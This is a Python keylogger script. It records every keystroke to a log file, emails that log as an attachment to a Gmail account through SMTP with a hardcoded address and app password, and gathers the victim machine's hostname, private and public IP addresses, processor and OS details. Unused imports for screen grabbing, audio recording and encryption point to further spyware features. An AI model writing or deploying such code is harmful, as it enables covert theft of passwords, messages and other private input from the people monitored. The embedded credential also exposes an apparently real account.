# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import pynput
from pynput.keyboard import Key, Listener
import logging

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_info = r"/key_log.txt"
system_info = "sys_details.txt"
log_dir = r"/Users/kenluong/Developer/python/"

email_addr = "anteikuu20@gmail.com"
password = "erfe mdvm mnck pghf"
toaddr = "anteikuu20@gmail.com"

keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def send_email(filename, attachment, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()

    server.sendmail(fromaddr, toaddr, text)
    server.quit()

send_email(key_info, log_dir + key_info, toaddr)

def system_details():
    with open(log_dir + system_info, "a") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            ip_public = get("https://api.ipify.org").text
            f.write("Public IP Address: " + ip_public + "\n")

        except Exception:
            f.write("Failed to retrieve Public IP Address\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n")

system_details()